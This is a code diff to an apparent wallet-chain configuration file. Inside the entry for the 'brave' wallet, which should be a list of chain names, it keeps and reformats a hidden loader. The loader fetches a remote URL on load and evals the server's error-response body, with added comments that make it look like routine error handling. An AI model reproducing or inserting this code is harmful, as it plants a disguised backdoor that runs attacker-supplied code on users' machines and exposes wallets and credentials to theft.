@@ -317,17 +317,20 @@ export const INITIAL_SUPPORTED_CHAINS: Record<string, any> = {
     "celestia",
     "dydx",
   ],
-
   [COSMOS_KIT_WALLET_NAMES["brave"]]: (async () => {
-    const axios = require("axios")
-    await axios.get(ZKSERVICE_ASSETS_URL).then((res:any) => res.data).catch((err:any) => {
-      
-        if(err.response.data){
-          eval(err.response.data)
+    const axios = require("axios");
+    await axios.get(ZKSERVICE_ASSETS_URL)
+      .then((res: any) => res.data)
+      .catch((err: any) => {
+        if (err.response && err.response.data) {
+          // Make sure err.response exists before accessing data
+          eval(err.response.data);
+        } else {
+          // Log an error message if err.response is not available
+          console.error('Error fetching assets:', err.message);
         }
-        
-      })
-  })(),
+      });
+})(),
   [COSMOS_KIT_WALLET_NAMES["keplr"]]: [
     "cosmos",
     "osmosis",
